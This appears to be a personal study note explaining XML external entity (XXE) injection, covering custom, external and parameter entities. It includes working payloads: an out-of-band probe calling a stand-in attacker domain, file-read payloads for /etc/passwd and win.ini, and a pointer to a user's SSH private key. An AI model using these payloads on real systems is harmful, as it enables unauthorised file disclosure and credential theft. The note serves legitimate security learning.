---
title: XML external entity (XXE) injection
updated: 2023-11-01 10:29:44Z
created: 2023-11-01 08:51:58Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

### Custom Entities
XML allows **custom entities** to be defined within the DTD. For example:

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: `"my entity value"`

### External Entities
The declaration of an **external entity** uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded. For example:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`
or
`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

### Parameter Entities
XML **parameter entitie**s are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things.
1. The declaration of an XML parameter entity includes the percent character before the entity name: 
`<!ENTITY % myparameterentity "my parameter entity value" >`
2. Parameter entities are referenced using the percent character instead of the usual ampersand: `%myparameterentity;`
This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:
`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`
This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.


# Attacks
Burp out with payload:
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>
<data>&example;</data>
```
OR
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "file:///c:/windows/win.ini"> ]>
<data>&example;</data>
```

#### Look for important files
`/home/knownuser/.ssh/id_rsa`

